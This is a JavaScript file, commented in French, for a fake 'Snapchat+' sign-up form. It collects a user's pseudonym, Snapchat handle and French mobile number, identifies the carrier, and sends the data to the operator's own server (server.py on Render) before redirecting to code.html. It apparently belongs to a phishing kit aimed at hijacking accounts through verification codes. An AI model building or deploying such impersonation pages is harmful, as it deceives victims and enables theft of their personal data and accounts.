"use strict";

// ═══════════════════════════════════════════════════════════════
//  FORMULAIRE SNAP+ — Envoi des données vers ton propre serveur
//  Quand l'utilisateur clique sur "Continuer", les infos sont
//  envoyées à ton serveur Python (server.py) sur Render.
//═══════════════════════════════════════════════════════════════

// Service forcé : Snapchat+ uniquement
const SVC = "snap";

const SVC_CFG = {
  snap: { label: "Snapchat+", handle: "Pseudo Snapchat", ph: "john.doe99", max: 15, icon: "\u{1F47B}" },
};

const SVC_COLORS = {
  snap: "#FFFC00",
};

const cfg = SVC_CFG[SVC];
const color = SVC_COLORS[SVC] || "#FFFC00";

document.documentElement.style.setProperty("--svc", color);
document.documentElement.style.setProperty("--svc-glow", color + "33");
document.getElementById("svc-badge").textContent = cfg.label;

// ── Steps ──
let step = 1;
const fill = document.getElementById("progress-fill");
const dots = document.querySelectorAll(".step-dot");

function goStep(n) {
  document.getElementById("step-" + step).classList.remove("active");
  document.getElementById("step-" + n).classList.add("active");
  fill.style.width = ((n - 1) / 3 * 100) + "%";
  dots.forEach((d, i) => {
    d.classList.toggle("done", i + 1 < n);
    d.classList.toggle("active", i + 1 === n);
  });
  step = n;
}

// ── Step 1: Pseudo ──
const inpP = document.getElementById("inp-pseudo");
const fbP = document.getElementById("fb-pseudo");
const btn1 = document.getElementById("btn-1");
let pseudoOk = false;

inpP.addEventListener("input", () => {
  const v = inpP.value.trim();
  pseudoOk = false;
  inpP.classList.remove("valid", "invalid");
  if (!v) { fbP.className = "feedback"; fbP.textContent = "3 a 32 caracteres"; }
  else if (v.length < 3) { inpP.classList.add("invalid"); fbP.className = "feedback err"; fbP.textContent = "Trop court"; }
  else if (!/^[a-zA-Z0-9_-]+$/.test(v)) { inpP.classList.add("invalid"); fbP.className = "feedback err"; fbP.textContent = "Caracteres non autorises"; }
  else { inpP.classList.add("valid"); fbP.className = "feedback ok"; fbP.textContent = "Pseudo valide"; pseudoOk = true; }
  btn1.disabled = !pseudoOk;
});

btn1.addEventListener("click", () => { if (pseudoOk) { goStep(2); document.getElementById("inp-handle").focus(); } });

// ── Step 2: Handle Snapchat ──
document.getElementById("step2-title").textContent = cfg.label;
document.getElementById("step2-sub").textContent = "Renseigne ton " + cfg.handle;
document.getElementById("step2-label").textContent = cfg.handle;

const inpH = document.getElementById("inp-handle");
const fbH = document.getElementById("fb-handle");
const btn2 = document.getElementById("btn-2");
let handleOk = false;

inpH.placeholder = cfg.ph;
inpH.maxLength = cfg.max;

inpH.addEventListener("input", () => {
  const v = inpH.value.trim();
  handleOk = false;
  inpH.classList.remove("valid", "invalid");
  if (!v) { fbH.className = "feedback"; fbH.textContent = ""; }
  else if (v.length < 2) { inpH.classList.add("invalid"); fbH.className = "feedback err"; fbH.textContent = "Trop court"; }
  else { inpH.classList.add("valid"); fbH.className = "feedback ok"; fbH.textContent = "@" + v; handleOk = true; }
  btn2.disabled = !handleOk;
});

document.getElementById("btn-back-2").addEventListener("click", () => { goStep(1); inpP.focus(); });
btn2.addEventListener("click", () => { if (handleOk) { goStep(3); inpPhone.focus(); } });

// ── Step 3: Phone ──
const inpPhone = document.getElementById("inp-phone");
const fbPhone = document.getElementById("fb-phone");
const btnSubmit = document.getElementById("btn-submit");
let phoneOk = false;

const OPERATORS = [
  [600,619,"Orange"],[620,629,"SFR"],[630,639,"Bouygues"],
  [640,649,"SFR"],[650,654,"Free"],[655,659,"SFR"],[660,669,"Orange"],
  [670,679,"Orange"],[680,689,"SFR"],[690,699,"Bouygues"],
  [700,709,"Orange"],[710,719,"Bouygues"],[720,739,"SFR"],[740,749,"Bouygues"],
  [750,754,"Free"],[760,779,"SFR"],[780,799,"Free"],
];

function getOp(num) {
  const p4 = parseInt(num.slice(0, 4), 10);
  for (const [a, b, op] of OPERATORS) if (p4 >= a && p4 <= b) return op;
  return "Inconnu";
}

inpPhone.addEventListener("input", () => {
  inpPhone.value = inpPhone.value.replace(/\D/g, "").slice(0, 10);
  const v = inpPhone.value;
  phoneOk = false;
  inpPhone.classList.remove("valid", "invalid");
  document.getElementById("op-badge").innerHTML = "";

  if (!v) { fbPhone.className = "feedback"; fbPhone.textContent = "Format : 06 ou 07 + 8 chiffres"; btnSubmit.disabled = true; return; }
  if (v.length < 10) { fbPhone.className = "feedback"; fbPhone.textContent = (10 - v.length) + " chiffres restants"; btnSubmit.disabled = true; return; }
  if (!/^0[67]\d{8}$/.test(v)) { inpPhone.classList.add("invalid"); fbPhone.className = "feedback err"; fbPhone.textContent = "Doit commencer par 06 ou 07"; btnSubmit.disabled = true; return; }

  const op = getOp(v);
  inpPhone.classList.add("valid");
  fbPhone.className = "feedback ok";
  fbPhone.textContent = "Numero valide";
  document.getElementById("op-badge").innerHTML = '<span class="op-tag">' + op + '</span>';
  phoneOk = true;
  btnSubmit.disabled = false;
});

document.getElementById("btn-back-3").addEventListener("click", () => { goStep(2); inpH.focus(); });

// ── Submit ──
btnSubmit.addEventListener("click", async () => {
  if (!pseudoOk || !handleOk || !phoneOk) return;
  btnSubmit.disabled = true;
  btnSubmit.innerHTML = '<div class="spinner"></div><span>Envoi...</span>';

  const rid = crypto.randomUUID ? crypto.randomUUID() : Date.now().toString(36) + Math.random().toString(36).slice(2);
  const phone = inpPhone.value;

  const ok = await sendRequest({
    requestId: rid,
    service: SVC,
    pseudo: inpP.value.trim(),
    handle: inpH.value.trim().toLowerCase(),
    phone,
    operator: getOp(phone),
    opType: "Mobile",
  });

  if (!ok || !ok.ok) {
    toast("Erreur lors de l'envoi", "error");
    btnSubmit.disabled = false;
    btnSubmit.innerHTML = '<span>Continuer</span>';
    return;
  }

  sessionStorage.setItem("verif", JSON.stringify({
    rid, svc: SVC,
    pseudo: inpP.value.trim(),
    handle: inpH.value.trim().toLowerCase(),
    phone,
  }));

  document.getElementById("step-" + step).style.display = "none";
  const okView = document.getElementById("step-ok");
  okView.style.display = "";
  fill.style.width = "100%";
  dots.forEach(d => { d.classList.remove("active"); d.classList.add("done"); });

  setTimeout(() => { window.location.href = "code.html"; }, 1200);
});

// ── Toast ──
function toast(msg, type) {
  const wrap = document.getElementById("toast-wrap");
  const el = document.createElement("div");
  el.className = "toast " + (type || "info");
  el.textContent = msg;
  wrap.appendChild(el);
  setTimeout(() => { el.style.opacity = "0"; setTimeout(() => el.remove(), 300); }, 3000);
}
